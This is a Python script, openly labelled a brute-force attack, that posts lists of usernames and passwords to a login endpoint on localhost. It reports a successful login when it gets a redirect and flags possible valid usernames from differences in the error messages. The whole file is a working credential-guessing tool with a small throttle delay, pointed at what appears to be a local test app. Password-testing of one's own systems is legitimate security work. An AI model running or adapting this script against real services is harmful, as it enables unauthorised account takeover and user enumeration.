import requests
import time

# Target URL for the login endpoint
LOGIN_URL = 'http://127.0.0.1:5000/login'

# Dictionary of usernames and their corresponding passwords to try
CREDENTIALS = {
    'siyad kanaprath': ['guest', 'ziyad11'],
    'admin': ['password', 'adminpassword', '123456'],
    'user1': ['test', 'user123', 'qwerty'],
    
    # Add more usernames and password lists here
}

def attempt_login(username, password):
    """Attempts to log in with the given username and password."""
    data = {'username': username, 'password': password}
    try:
        response = requests.post(LOGIN_URL, data=data, allow_redirects=False)
        # Check for a successful login condition. This might vary depending on the application.
        # Common indicators include a redirect to a dashboard or a specific status code.
        if response.status_code == 302:  # Assuming a successful login redirects
            print(f"[+] Successful login found - Username: {username}, Password: {password}")
            return True
        elif 'Invalid username or password' not in response.text:
            # If the error message is different, it might indicate a valid username
            print(f"[!] Possible valid username - Username: {username}, Password: {password}, Response: {response.text[:50]}...")
        else:
            print(f"[-] Login failed - Username: {username}, Password: {password}")
        return False
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        return False

def brute_force():
    """Performs a basic brute-force attack based on the provided credentials."""
    print("[*] Starting brute-force attack...")
    for username, passwords in CREDENTIALS.items():
        print(f"[*] Trying username: {username}")
        for password in passwords:
            if attempt_login(username, password):
                return  # Stop if successful login is found
            time.sleep(0.1)  # Add a small delay to avoid overwhelming the server

if __name__ == "__main__":
    brute_force()
    print("[*] Brute-force attack finished.")